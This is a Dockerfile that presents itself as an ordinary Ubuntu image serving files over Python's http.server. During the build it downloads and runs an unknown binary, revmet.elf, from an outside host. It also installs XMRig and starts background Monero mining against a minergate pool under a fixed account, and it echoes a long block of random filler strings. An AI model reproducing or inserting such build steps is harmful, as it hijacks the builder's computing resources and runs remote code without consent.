FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo LBmbDMd1yYm9ukTfq6PGWzCAdLwK67SQ 860wCubtVxlu7kKnoz51EltKNUOOdRHz 0WuOE1CSjPpi5avvDSq7yYgETNhzbOyZ atHqZQIkZgFrYH28tiLsm54fWwEo8mrH Ph3DQGMJyiD6DV16njkWAsHOM4sorZat 0fE5JOCM1IXEGpmsy8ZjFtRTBBP2ERSj fnjrhLmbCXP5rRANUcFDuzw5d0QYsNlD aeItNDyU44qEjsxJTa7CJK7TXi1B6d8b ZLcd8XLIV1atcs6L7MQ9kOMFZaL9Ef1o ack8INV3JHEI7an7mGm0YZCh4vZ1y56B 8ebLmn425ECVEaQwMdLYenymBqvA9AKN HDaYeGpZe2WwKj5eBUmAl8rnkOSwrdnf KiTIawEDq7dN4OJT5JuSzjP7iw1B4g47 IMxSW27OjAj9DvBwCjngwGCaywjLYatj DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]